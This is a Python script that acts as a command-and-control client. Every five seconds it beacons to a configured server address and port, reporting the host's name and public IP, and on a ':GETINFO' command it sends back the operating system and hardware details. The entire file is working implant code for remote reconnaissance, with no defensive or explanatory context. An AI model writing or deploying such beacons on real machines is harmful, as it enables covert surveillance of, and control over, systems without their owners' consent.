import platform
import socket
from requests import get
import time

ip = '127.0.0.1'
port = 4570

def send_pcinfo():
    system_info = platform.uname()
    node_name = system_info.node
    DeviceIP = get('https://api.ipify.org').text

    info = [
        ":PCINFO",
        node_name,
        f"System: {system_info.system}",
        f"Release: {system_info.release}",
        f"Version: {system_info.version}",
        f"Machine: {system_info.machine}",
        f"Processor: {system_info.processor}",
        f"IP: {DeviceIP}"
    ]

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send("\n".join(info).encode())
    s.close()

def main():
    system_info = platform.uname()
    node_name = system_info.node
    DeviceIP = get('https://api.ipify.org').text

    while True:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.connect((ip, port))

            ping = f":CLIENTPING\n{node_name}\n{DeviceIP}"
            server.send(ping.encode())
            response = server.recv(4096).decode()

            if response.startswith(":COMMAND :GETINFO"):
                print("[+] Got :GETINFO, sending PC info...")
                send_pcinfo()

            server.close()
        except Exception as e:
            print(f"[!] Error: {e}")

        time.sleep(5)

if __name__ == "__main__":
    main()
